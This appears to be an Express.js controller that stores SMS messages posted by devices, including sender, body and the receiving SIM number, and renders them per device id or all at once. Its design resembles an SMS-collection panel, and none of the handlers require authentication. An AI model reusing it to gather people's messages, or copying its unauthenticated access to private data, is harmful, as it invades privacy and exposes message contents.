const Notification = require('../models/Notification');

// Save a notification (SMS) to the database
exports.saveNotification = async (req, res) => {
    try {
        const { sender, senderNumber, receiverNumber, title, body, timestamp, uniqueid } = req.body;

        if (!receiverNumber) {
            return res.status(400).json({ success: false, message: "Receiver number is required" });
        }

        const notification = new Notification({
            sender,
            senderNumber,
            receiverNumber, // SIM number is saved here
            title,
            body,
            timestamp,
            uniqueid
        });

        await notification.save();

        res.status(201).json({
            success: true,
            message: "Notification saved successfully"
        });
    } catch (err) {
        console.error("Error saving notification:", err);
        res.status(500).json({
            success: false,
            message: "Error saving notification",
            error: err.message
        });
    }
};

exports.getCustomSms = async (req, res) => {
    try {
        console.log("Params received:", req.params);
        let { uniqueid } = req.params;

        if (!uniqueid) {
            console.log("uniqueid is undefined!");
            return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
        }

        console.log("Searching for SMS data with uniqueid:", uniqueid);
        const smsData = await Notification.find({ uniqueid });

        if (!smsData || smsData.length === 0) {
            console.log("No SMS data found for uniqueid:", uniqueid);
            return res.render('sms', { smsData: [] });
        }

        console.log("SMS data found:", smsData.length, "messages");
        res.render('sms', { smsData });
    } catch (error) {
        console.error("Error fetching SMS data:", error);
        res.status(500).send("Internal Server Error");
    }
};

exports.getAllSms = async (req, res) => {
    try {
        console.log("Fetching all SMS data...");
        const smsData = await Notification.find();

        if (!smsData || smsData.length === 0) {
            console.log("No SMS data found in database.");
            return res.render('sms', { smsData: [] });
        }

        console.log("Total SMS found:", smsData.length);
        res.render('sms', { smsData });
    } catch (error) {
        console.error("Error fetching all SMS data:", error);
        res.status(500).send("Internal Server Error");
    }
};
